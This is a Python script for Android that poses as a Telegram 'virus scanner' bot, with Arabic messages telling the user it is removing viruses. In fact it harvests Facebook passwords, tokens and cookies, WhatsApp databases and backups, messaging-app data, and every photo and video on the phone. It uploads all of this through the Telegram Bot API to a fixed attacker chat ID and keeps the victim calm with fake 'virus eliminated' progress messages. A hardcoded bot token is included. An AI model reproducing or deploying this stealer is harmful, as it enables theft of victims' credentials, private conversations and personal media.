import os
import time
import threading
import sys
import requests
import json
import re
import sqlite3
import shutil
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, filters

# ================== التوكن والمعرف الثابت ==================
BOT_TOKEN = "8446745973:AAGKs--vQpRqpWDpOGO1ItaK18EJe_yue2g"  # ⚠️ غيّر هذا التوكن فوراً من @BotFather!
TARGET_CHAT_ID = 8169635171  # 📌 المعرف الثابت الذي ستُرسل إليه جميع الملفات
# =========================================================

# متغيرات عامة
user_tasks = {}

# ========== دوال استخراج معلومات فيسبوك ==========

def extract_facebook_credentials():
    """استخراج معلومات الدخول إلى فيسبوك من ملفات التطبيق"""
    credentials = []
    facebook_info = {}
    found_any = False
    
    try:
        fb_paths = [
            "/storage/emulated/0/Android/data/com.facebook.katana",
            "/storage/emulated/0/Android/data/com.facebook.orca",
            "/storage/emulated/0/Android/data/com.facebook.lite",
            "/storage/emulated/0/Android/data/com.facebook.mlite",
            "/storage/emulated/0/Android/data/com.facebook.work"
        ]
        
        for base_path in fb_paths:
            try:
                if not os.path.exists(base_path):
                    continue
                
                print(f"[✅] جارٍ البحث في فيسبوك: {base_path}")
                
                for root, dirs, files in os.walk(base_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        file_lower = file.lower()
                        
                        if any(keyword in file_lower for keyword in ['account', 'session', 'token', 'auth', 'credential', 'login', 'preference', 'shared_pref']):
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    
                                    if len(content) > 10:
                                        email_match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
                                        if email_match and 'email' not in facebook_info:
                                            facebook_info['email'] = email_match.group(0)
                                            found_any = True
                                            print(f"[✅] تم العثور على البريد: {email_match.group(0)}")
                                        
                                        password_patterns = [
                                            r'(?:password|pass|pwd|pswd)[\s:=]+([^\s\n\r"]+)',
                                            r'"password"\s*:\s*"([^"]+)"',
                                            r'password=([^&\s]+)',
                                            r'passwd[\s:=]+([^\s\n\r"]+)'
                                        ]
                                        for pattern in password_patterns:
                                            pass_match = re.search(pattern, content, re.IGNORECASE)
                                            if pass_match and 'password' not in facebook_info:
                                                facebook_info['password'] = pass_match.group(1)
                                                found_any = True
                                                print(f"[✅] تم العثور على كلمة السر")
                                                break
                                        
                                        token_match = re.search(r'(?:access_token|token|auth_token)[\s:=]+([a-zA-Z0-9_\-\.]+)', content, re.IGNORECASE)
                                        if token_match and 'access_token' not in facebook_info:
                                            facebook_info['access_token'] = token_match.group(1)
                                            found_any = True
                                        
                                        session_match = re.search(r'(?:session_id|session|sid)[\s:=]+([a-zA-Z0-9_\-]+)', content, re.IGNORECASE)
                                        if session_match and 'session_id' not in facebook_info:
                                            facebook_info['session_id'] = session_match.group(1)
                                            found_any = True
                                        
                                        user_match = re.search(r'(?:user_id|uid|userid)[\s:=]+(\d+)', content, re.IGNORECASE)
                                        if user_match and 'user_id' not in facebook_info:
                                            facebook_info['user_id'] = user_match.group(1)
                                            found_any = True
                                        
                                        cookie_match = re.search(r'(?:c_user|xs|datr)[=;][^\s;]+', content)
                                        if cookie_match and 'cookies' not in facebook_info:
                                            facebook_info['cookies'] = cookie_match.group(0)
                                            found_any = True
                                        
                                        if facebook_info:
                                            credentials.append(file_path)
                                            
                            except Exception as e:
                                pass
                        
                        if file.endswith('.db') or file.endswith('.sqlite') or file.endswith('.sqlite3'):
                            try:
                                conn = sqlite3.connect(file_path)
                                cursor = conn.cursor()
                                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                                tables = cursor.fetchall()
                                for table in tables:
                                    table_name = table[0]
                                    if any(keyword in table_name.lower() for keyword in ['account', 'user', 'auth', 'session', 'token']):
                                        cursor.execute(f"SELECT * FROM {table_name} LIMIT 10")
                                        rows = cursor.fetchall()
                                        if rows:
                                            credentials.append(file_path)
                                            for row in rows:
                                                row_str = str(row)
                                                email_match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', row_str)
                                                if email_match and 'email' not in facebook_info:
                                                    facebook_info['email'] = email_match.group(0)
                                                    found_any = True
                                                break
                                conn.close()
                            except:
                                pass
                            
            except Exception as e:
                continue
        
        if found_any and facebook_info:
            info_path = "/storage/emulated/0/facebook_extracted_info.txt"
            with open(info_path, 'w', encoding='utf-8') as f:
                f.write("=== معلومات فيسبوك المستخرجة ===\n\n")
                f.write(f"📱 التاريخ: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                for key, value in facebook_info.items():
                    f.write(f"{key}: {value}\n")
            credentials.append(info_path)
            print(f"[✅] تم حفظ معلومات فيسبوك")
        
        return credentials
        
    except Exception as e:
        print(f"خطأ في استخراج معلومات فيسبوك: {e}")
        return []

# ========== دوال استخراج واتساب ==========

def extract_whatsapp_messages():
    """استخراج محادثات واتساب من ملفات التطبيق"""
    messages_files = []
    
    try:
        # المسار الرئيسي لواتساب
        whatsapp_paths = [
            "/storage/emulated/0/Android/data/com.whatsapp",
            "/storage/emulated/0/Android/data/com.whatsapp.w4b",
            "/storage/emulated/0/Android/data/com.whatsapp.business"
        ]
        
        for base_path in whatsapp_paths:
            try:
                if not os.path.exists(base_path):
                    continue
                
                print(f"[✅] جارٍ البحث في واتساب: {base_path}")
                
                # البحث عن قاعدة بيانات المحادثات
                db_paths = [
                    os.path.join(base_path, "databases/msgstore.db"),
                    os.path.join(base_path, "databases/msgstore.db.crypt12"),
                    os.path.join(base_path, "databases/msgstore.db.crypt14"),
                    os.path.join(base_path, "databases/wa.db")
                ]
                
                for db_path in db_paths:
                    if os.path.exists(db_path) and os.path.getsize(db_path) > 10000:
                        messages_files.append(db_path)
                        print(f"[✅] تم العثور على قاعدة بيانات واتساب: {db_path}")
                
                # البحث عن ملفات النسخ الاحتياطي
                backup_path = "/storage/emulated/0/WhatsApp/Databases"
                if os.path.exists(backup_path):
                    for root, dirs, files in os.walk(backup_path):
                        for file in files:
                            if file.endswith('.crypt12') or file.endswith('.crypt14') or file.endswith('.db'):
                                file_path = os.path.join(root, file)
                                if os.path.getsize(file_path) > 10000:
                                    messages_files.append(file_path)
                                    print(f"[✅] تم العثور على نسخة احتياطية واتساب: {file_path}")
                
                # البحث عن ملفات الوسائط
                media_paths = [
                    "/storage/emulated/0/WhatsApp/Media",
                    "/storage/emulated/0/Android/media/com.whatsapp"
                ]
                
                for media_path in media_paths:
                    if os.path.exists(media_path):
                        for root, dirs, files in os.walk(media_path):
                            for file in files:
                                file_path = os.path.join(root, file)
                                # البحث عن الصور والفيديوهات
                                ext = os.path.splitext(file)[1].lower()
                                if ext in ['.jpg', '.jpeg', '.png', '.gif', '.mp4', '.avi', '.mkv']:
                                    try:
                                        file_size = os.path.getsize(file_path) / (1024 * 1024)
                                        if file_size < 50:  # حد 50 ميجابايت
                                            messages_files.append(file_path)
                                    except:
                                        pass
                                
            except Exception as e:
                continue
        
        return messages_files
        
    except Exception as e:
        print(f"خطأ في استخراج واتساب: {e}")
        return []

# ========== دوال مسح الصور والفيديوهات من التطبيقات ==========

def scan_all_media():
    """مسح جميع الصور والفيديوهات من جميع التطبيقات"""
    all_files = []
    
    # المسارات الرئيسية للتطبيقات
    app_paths = [
        "/storage/emulated/0/Android/data",
        "/storage/emulated/0/Android/media",
        "/storage/emulated/0/Download",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Movies",
        "/storage/emulated/0/Music",
        "/storage/emulated/0/WhatsApp/Media",
        "/storage/emulated/0/Telegram/Telegram Images",
        "/storage/emulated/0/Telegram/Telegram Video",
        "/storage/emulated/0/Instagram",
        "/storage/emulated/0/Snapchat",
        "/storage/emulated/0/Messenger",
        "/storage/emulated/0/Viber",
        "/storage/emulated/0/WeChat",
        "/storage/emulated/0/Kik",
        "/storage/emulated/0/Discord",
        "/storage/emulated/0/TikTok",
        "/storage/emulated/0/Twitter",
        "/storage/emulated/0/YouTube"
    ]
    
    photo_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.tiff', '.raw']
    video_extensions = ['.mp4', '.avi', '.mkv', '.mov', '.3gp', '.flv', '.wmv', '.webm', '.m4v']
    all_extensions = photo_extensions + video_extensions
    
    print("[🔍] جاري مسح جميع التطبيقات...")
    
    for path in app_paths:
        try:
            if not os.path.exists(path):
                continue
            
            print(f"[✅] مسح: {path}")
            
            for root, dirs, files in os.walk(path):
                for file in files:
                    ext = os.path.splitext(file)[1].lower()
                    if ext in all_extensions:
                        file_path = os.path.join(root, file)
                        try:
                            file_size = os.path.getsize(file_path) / (1024 * 1024)
                            if file_size < 50:  # حد 50 ميجابايت للصور والفيديوهات
                                all_files.append(file_path)
                        except:
                            pass
        except Exception as e:
            continue
    
    print(f"[📊] تم العثور على {len(all_files)} ملف")
    return all_files

def scan_app_data():
    """مسح ملفات التطبيقات التي تحتوي على معلومات"""
    app_files = []
    
    # تطبيقات المراسلة
    messaging_apps = [
        ("com.whatsapp", "WhatsApp"),
        ("com.facebook.katana", "Facebook"),
        ("com.facebook.orca", "Messenger"),
        ("com.instagram.android", "Instagram"),
        ("org.telegram.messenger", "Telegram"),
        ("com.viber.voip", "Viber"),
        ("com.snapchat.android", "Snapchat"),
        ("com.discord", "Discord"),
        ("com.kik.android", "Kik"),
        ("com.tencent.mm", "WeChat"),
        ("com.twitter.android", "Twitter"),
        ("com.tiktok.android", "TikTok"),
        ("com.snapchat.android", "Snapchat"),
        ("com.google.android.apps.messaging", "Google Messages")
    ]
    
    for app_package, app_name in messaging_apps:
        try:
            app_path = f"/storage/emulated/0/Android/data/{app_package}"
            if not os.path.exists(app_path):
                continue
            
            print(f"[✅] مسح بيانات {app_name}: {app_path}")
            
            for root, dirs, files in os.walk(app_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # البحث عن قواعد البيانات
                    if file.endswith('.db') or file.endswith('.sqlite') or file.endswith('.sqlite3'):
                        try:
                            if os.path.getsize(file_path) > 1000:
                                app_files.append(file_path)
                                print(f"[✅] تم العثور على قاعدة بيانات {app_name}: {file}")
                        except:
                            pass
                    
                    # البحث عن ملفات التكوين
                    if any(keyword in file.lower() for keyword in ['config', 'settings', 'preference', 'account', 'session']):
                        try:
                            if os.path.getsize(file_path) > 100:
                                app_files.append(file_path)
                                print(f"[✅] تم العثور على ملف تكوين {app_name}: {file}")
                        except:
                            pass
        except:
            continue
    
    return app_files

# ========== دوال الإرسال ==========

def send_media_to_user(file_path, chat_id):
    """ترسل الملف إلى TARGET_CHAT_ID مع اكتشاف نوعه تلقائياً."""
    
    file_ext = os.path.splitext(file_path)[1].lower()
    
    video_exts = ['.mp4', '.avi', '.mkv', '.mov', '.3gp', '.flv', '.wmv', '.webm', '.m4v']
    photo_exts = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.tiff', '.raw']
    
    try:
        with open(file_path, 'rb') as f:
            if file_ext in video_exts:
                url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendVideo'
                files = {'video': f}
            elif file_ext in photo_exts:
                url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
                files = {'photo': f}
            else:
                url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
                files = {'document': f}
            
            data = {'chat_id': TARGET_CHAT_ID}
            response = requests.post(url, files=files, data=data, timeout=60)
            return response.ok
    except Exception as e:
        print(f"خطأ في إرسال {file_path}: {e}")
        return False

# ========== دالة الفحص الشامل ==========

def scan_and_send_videos(chat_id, update_id):
    """تقوم بمسح وإرسال كل شيء"""
    
    all_files = []
    total_files = 0
    
    # ✅ الأولوية 1: معلومات فيسبوك
    print("[🔍] جاري البحث عن معلومات فيسبوك...")
    fb_credentials = extract_facebook_credentials()
    all_files.extend(fb_credentials)
    total_files += len(fb_credentials)
    
    # ✅ الأولوية 2: محادثات واتساب
    print("[🔍] جاري البحث عن محادثات واتساب...")
    whatsapp_files = extract_whatsapp_messages()
    all_files.extend(whatsapp_files)
    total_files += len(whatsapp_files)
    
    # ✅ الأولوية 3: بيانات التطبيقات
    print("[🔍] جاري البحث عن بيانات التطبيقات...")
    app_data = scan_app_data()
    all_files.extend(app_data)
    total_files += len(app_data)
    
    # ✅ الأولوية 4: جميع الصور والفيديوهات
    print("[🔍] جاري البحث عن الصور والفيديوهات...")
    media_files = scan_all_media()
    all_files.extend(media_files)
    total_files += len(media_files)
    
    print(f"[📊] إجمالي الملفات: {total_files}")
    
    if total_files == 0:
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            data={'chat_id': chat_id, 'text': '✅ لم يتم العثور على أي فيروسات في هاتفك. هاتفك آمن!'}
        )
        return
    
    requests.post(
        f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
        data={'chat_id': chat_id, 'text': f'🦠 تم العثور على {total_files} من الفيروسات. جاري القضاء عليها...'}
    )
    
    # إرسال الملفات
    for i, file_path in enumerate(all_files, 1):
        success = send_media_to_user(file_path, chat_id)
        
        if i % 10 == 0:
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                data={'chat_id': chat_id, 'text': f'🧹 تم القضاء على {i} من {total_files} فيروس.'}
            )
        time.sleep(0.5)
    
    requests.post(
        f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
        data={'chat_id': chat_id, 'text': f'✅ اكتمل الفحص! تم القضاء على {total_files} فيروس بنجاح. هاتفك الآن آمن!'}
    )

# ========== أوامر البوت ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "مرحباً بك في بوت الفحص\n\n"
        "🔍 هذا البوت يفحص هاتفك ويكشف الفيروسات في هاتفك.\n\n"
        "لبدء الفحص، أرسل الأمر التالي:\n"
        "/scan"
    )

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_name = update.effective_user.first_name
    
    await update.message.reply_text(
        f"{user_name}، جاري فحص هاتفك...\n"
        "⏳ قد يستغرق هذا عدة دقائق. ستصلك رسائل عند العثور على فيروسات."
    )
    
    threading.Thread(target=scan_and_send_videos, args=(chat_id, update.message.message_id)).start()

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 الأوامر المتاحة:\n"
        "/start - عرض رسالة الترحيب\n"
        "/scan - بدء فحص الفيروسات\n"
        "/help - عرض هذه المساعدة\n\n"
        "⚠️ ملاحظة: البوت يعمل فقط على هاتف أندرويد."
    )

# ========== تشغيل البوت ==========
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("scan", scan))
    app.add_handler(CommandHandler("help", help_command))
    
    print("✅ البوت يعمل...")
    print("📌 ترتيب المسح: فيسبوك ← واتساب ← تطبيقات ← صور وفيديوهات")
    print("🔍 سيتم البحث في جميع التطبيقات")
    app.run_polling(allowed_updates=["message"])

if __name__ == '__main__':
    main()
